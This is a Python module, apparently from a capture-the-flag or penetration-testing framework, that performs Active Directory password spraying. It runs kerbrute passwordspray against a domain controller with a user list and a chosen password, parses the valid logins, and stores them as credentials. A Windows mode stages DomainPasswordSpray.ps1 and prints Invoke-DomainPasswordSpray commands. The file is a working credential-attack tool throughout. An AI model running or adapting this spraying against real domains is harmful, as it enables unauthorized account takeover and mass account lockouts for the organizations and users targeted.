PROVIDES = ["spray"]
REQUIRES = []

def run(
    data,
    cred,
    args
):

    from pathlib import Path
    from datetime import datetime
    from core.target import target_add_cred
    from core.paths import get_chain_artifacts_dir
    import subprocess
    import argparse

    G = '\033[92m'
    C = '\033[96m'
    B = '\033[94m'
    Y = '\033[93m'
    R = '\033[91m'
    W = '\033[0m'
    BOLD = '\033[1m'

    target = data.get("ip")
    domain = data.get("domain")


    #
    # WINDOWS REFERENCE MODE
    #

    if getattr(args, "windows", False):

        from modules.upload.windows import stage_windows_files
        from core.paths import get_tools_dir

        print(
            f"\n{B}[?]{W} Transfer DomainPasswordSpray.ps1?"
        )

        choice = input(
            f"{C}[Y/n] > {W}"
        ).strip().lower()

        if choice in ("", "y", "yes"):

            stage_windows_files([
                str(
                    get_tools_dir() /
                    "windows" /
                    "DomainPasswordSpray.ps1"
                )
            ])

        print(
            f"\n{G}[+] {W}PowerShell Commands\n"
        )

        print(
            f"{Y}Import-Module .\\DomainPasswordSpray.ps1{W}"
        )

        if len(args.extra) >= 2:
            custom_list = args.extra[1]
            password = args.extra[0]


            print(
                f"{Y}"
                f"Invoke-DomainPasswordSpray "
                f"-Password {password} "
                f"-UserList {custom_list} "
                f"-OutFile spray_success "
                f"-ErrorAction SilentlyContinue"
                f"{W}"
            )

        else:
            password = args.extra[0]

            print(
                f"{Y}"
                f"Invoke-DomainPasswordSpray "
                f"-Password {password} "
                f"-OutFile spray_success "
                f"-ErrorAction SilentlyContinue"
                f"{W}"
            )

        print()

        return data


    if not target or not domain:

        print(
            f"\n{R}[!] {W}Missing target/domain\n"
        )

        return data

    if not getattr(args, "extra", None):

        print(
            f"\n{R}[!] {W}Missing password\n"
        )

        print(
            f"{B}Usage:{W} "
            f"{Y}ctf ad.spray PASSWORD [USERLIST]{W}\n"
        )

        return data

    password = args.extra[0]

    artifact_dir = get_chain_artifacts_dir(
        data["name"],
        "ad"
    )

    artifact_dir.mkdir(
        parents=True,
        exist_ok=True
    )

    #
    # USERLIST
    #

    if len(args.extra) >= 2:

        users_file = Path(
            args.extra[1]
        ).expanduser().resolve()

    else:

        users_file = (
            artifact_dir /
            "users.txt"
        )

    if not users_file.exists():

        print(
            f"\n{R}[!] {W}User list not found\n"
        )

        print(
            f"{B}  └── {C}{users_file}{W}\n"
        )

        return data

    #
    # WARNING
    #

    print(
        f"\n{Y}[!]{W} Password spraying can lock accounts"
    )

    confirm = input(
        f"{C}Continue? [y/N] > {W}"
    ).strip().lower()

    if confirm != "y":

        print()

        return data

    #
    # ARTIFACTS
    #

    timestamp = datetime.now().strftime(
        "%Y%m%d_%H%M%S"
    )

    logfile = (
        artifact_dir /
        f"spray_{timestamp}.log"
    )

    success_file = (
        artifact_dir /
        "spray_success.txt"
    )

    #
    # HUD
    #

    user_count = len(
        users_file.read_text(
            errors="ignore"
        ).splitlines()
    )

    print(
        f"\n{B}┌── {BOLD}MODULE: PASSWORD SPRAY{W}{B} ──────────┐{W}"
    )

    print(
        f"{B}│{W}  {B}Domain:{W} "
        f"{C}{domain:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}DC:{W}     "
        f"{C}{target:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}Users:{W}  "
        f"{C}{str(user_count):<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}│{W}  {B}Pass:{W}   "
        f"{C}{password:<28}{W}"
        f"{B}│{W}"
    )

    print(
        f"{B}└─────────────────────────────────────────┘{W}"
    )

    #
    # KERBRUTE
    #

    cmd = [
        "kerbrute",
        "passwordspray",
        "-d",
        domain,
        "--dc",
        target,
        str(users_file),
        password
    ]

    print(
        f"\n{B}[*]{W} Password Spraying\n"
    )

    print(
        f"{Y}{' '.join(cmd)}{W}\n"
    )

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    logfile.write_text(
        result.stdout +
        result.stderr
    )

    print(
        result.stdout
    )

    #
    # PARSE
    #

    creds = []

    for line in result.stdout.splitlines():

        if "VALID LOGIN:" not in line:
            continue

        try:

            username = (
                line.split(
                    "VALID LOGIN:",
                    1
                )[1]
                .strip()
                .split("@")[0]
            )

            creds.append({
                "user": username,
                "password": password
            })

        except Exception:

            pass

    #
    # SAVE
    #

    if creds:

        success_file.write_text(
            "\n".join(
                f"{c['user']}:{c['password']}"
                for c in creds
            )
        )

        print(
            f"\n{G}[+] {W}Valid Credentials\n"
        )

        for c in creds:

            print(
                f"  {B}├──{W} "
                f"{C}{c['user']}{W}:"
                f"{Y}{c['password']}{W}"
            )

            target_add_cred(
                argparse.Namespace(
                    user=c["user"],
                    password=c["password"],
                    hash=None,
                    aes=None,
                    ccache=None
                )
            )

        print()

        print(
            f"{G}[+] {W}Saved"
        )

        print(
            f"{B}  └── {C}{success_file}{W}"
        )

    else:

        print(
            f"\n{Y}[-]{W} No valid credentials found"
        )

    print()

    print(
        f"{G}[+] {W}Log"
    )

    print(
        f"{B}  └── {C}{logfile}{W}\n"
    )

    return data
